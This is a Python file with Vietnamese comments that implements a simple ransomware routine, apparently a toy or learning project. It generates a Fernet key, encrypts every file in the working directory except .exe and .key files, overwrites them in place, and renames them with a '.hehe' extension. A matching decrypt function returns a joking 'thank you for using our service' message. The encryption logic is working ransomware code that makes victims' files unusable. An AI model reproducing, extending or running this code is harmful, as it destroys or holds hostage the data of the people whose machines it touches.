from cryptography.fernet import Fernet, InvalidToken
import os
from wlog import check_log, update_log

def key_gen():
    # tạo key
    key = Fernet.generate_key()
    # lưu key vào file
    with open('filekey.key', 'wb') as filekey:
        filekey.write(key)
    # mở key
    with open('filekey.key', 'rb') as filekey:
        key = filekey.read()

    return key


def encrypt_files(key,files):
    for file in files:  
        # Mở file lấy nội dung
        with open(file, 'rb') as raw_file:
            original = raw_file.read()

        # Mã hóa nội dung vừa lấy
        encrypted = Fernet(key).encrypt(original)

        # Ghi đè nội dung đã mã hóa vào file 
        with open(file, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

         # Đổi tên file để thêm phần mở rộng .hehe
        new_file_name = file + '.hehe'
        os.rename(file, new_file_name)


def list_files():
    # Lấy đường dẫn thư mục hiện tại
    current_directory = os.getcwd()

    files = []
    
    # Duyệt qua tất cả các mục trong thư mục hiện tại
    for item in os.listdir(current_directory):
        # Kiểm tra xem mục đó có phải là tệp không
        if os.path.isfile(os.path.join(current_directory, item)):
                files.append(item)
    
    return files





def decrypt(key,files):
    try:
        fernet = Fernet(key)
        for file in files:
            # Mở file đã mã hóa
            with open(file, 'rb') as enc_file:
                encrypted = enc_file.read()
            
            # Giải mã file
            decrypted = fernet.decrypt(encrypted)
            
            # Ghi đè dữ liệu đã giải lại vào file 
            with open(file, 'wb') as dec_file:
                dec_file.write(decrypted)

            # Xóa phần mở rộng .hehe
            if file.endswith('.hehe'):
                new_file_name = file[:-5] 
                os.rename(file, new_file_name)

    #Nếu lỗi key thì báo lỗi
    except InvalidToken:
        return "Key lỗi hoặc bị hỏng! Vui lòng kiểm tra lại (Code 1)"
    except ValueError:
        return "Key lỗi hoặc bị hỏng! Vui lòng kiểm tra lại (Code 2)"
    else:
        update_log(0)
        return "Giải mã thành công!\n Cám ơn bạn đã sử dụng dịch vụ!\n Nếu hài lòng, vui lòng đánh giá 5 sao để được giảm giá cho lần tiếp theo "





def main_process(key):
    files = list_files()
    excluded_extensions = ['.exe', '.key']
    hehe_files = [file for file in files if not any(file.endswith(ext) for ext in excluded_extensions)]
    if check_log() == 1:
        return decrypt(key, hehe_files)
    else:
        encrypt_files(key, hehe_files)
        update_log(1)


    
